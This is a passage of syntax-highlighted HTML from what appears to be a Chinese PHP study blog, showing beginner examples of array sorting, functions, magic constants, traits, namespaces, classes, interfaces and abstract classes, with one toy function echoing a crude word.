punctuation\">(</span><span class=\"token variable\">$age</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$x</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$x_value</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Key=\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\", Value=\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$x_value</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">arsort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//键值降序</span>\n<span class=\"token function\">ksort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//键名升序</span>\n<span class=\"token function\">krsort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//键名降序</span>\n<span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">each</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"????\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"you arb bici\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tt'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"魔术变量\"><a href=\"#魔术变量\" class=\"headerlink\" title=\"魔术变量\"></a>魔术变量</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'这是第 \" '</span>  <span class=\"token operator\">.</span> <span class=\"token constant\">__LINE__</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' \" 行'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'该文件位于 \" '</span>  <span class=\"token operator\">.</span> <span class=\"token constant\">__FILE__</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' \" '</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'该文件位于 \" '</span>  <span class=\"token operator\">.</span> <span class=\"token constant\">__DIR__</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' \" '</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span>  <span class=\"token string single-quoted-string\">'函数名为：'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">__FUNCTION__</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span>  <span class=\"token string single-quoted-string\">'函数名为：'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">__METHOD__</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">_print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'类名为：'</span>  <span class=\"token operator\">.</span> <span class=\"token constant\">__CLASS__</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span>  <span class=\"token string single-quoted-string\">'函数名为：'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">__FUNCTION__</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$t</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">_print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Base</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Hello '</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">trait</span> <span class=\"token class-name-definition class-name\">SayWorld</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'World!'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MyHelloWorld</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Base</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">use</span> <span class=\"token package\">SayWorld</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MyHelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$o</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//namespace MyProject;</span>\n\n<span class=\"token comment\">//echo '命名空间为：\"', __NAMESPACE__, '\"'; // 输出 \"MyProject\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"命名空间\"><a href=\"#命名空间\" class=\"headerlink\" title=\"命名空间\"></a>命名空间</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token keyword\">namespace</span> <span class=\"token package\">MyProject</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token constant\">CONNECT_OK</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Connection</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span>  <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">AnotherProject</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token constant\">CONNECT_OK</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Connection</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* ... */</span>  <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Site</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/* 成员变量 */</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$title</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$par1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$par2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">title</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"销毁 \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">/* 成员函数 */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setUrl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">url</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">title</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">title</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$runoob</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$taobao</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$google</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 调用成员函数，设置标题和URL</span>\n<span class=\"token variable\">$runoob</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"菜鸟教程\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$taobao</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"淘宝\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$google</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"Google 搜索\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$runoob</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'www.runoob.com'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$taobao</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'www.taobao.com'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$google</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'www.google.com'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 调用成员函数，获取标题和URL</span>\n<span class=\"token variable\">$runoob</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$taobao</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$google</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getTitle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$runoob</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$taobao</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$google</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 子类扩展站点类别</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Child_Site</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Site</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$category</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setCate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$par</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">category</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$par</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getCate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">category</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 声明一个'iTemplate'接口</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name-definition class-name\">iTemplate</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setVariable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$template</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token comment\">// 实现接口</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Template</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">iTemplate</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$vars</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setVariable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">vars</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$template</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">vars</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$template</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'{'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'}'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$template</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$template</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">constant</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'常量值'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。</span>\n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">AbstractClass</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 强制要求子类定义这些方法</span>\n    <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">prefixValue</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$prefix</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 普通方法（非抽象方法）</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">printOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">print</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ConcreteClass1</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractClass</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ConcreteClass1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">prefixValue</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$prefix</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$prefix</span><span class=\"token punctuation\">}</span></span>ConcreteClass1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ConcreteClass2</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractClass</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ConcreteClass2\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">prefixValue</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$prefix</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$prefix</span><span class=\"token punctuation\">}</span></span>ConcreteClass2\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$class1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConcreteClass1</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$class1</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">printOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$class1</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prefixValue</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'FOO_'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$class2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConcreteClass2</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$class2</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">printOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$class2</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prefixValue</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'FOO_'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n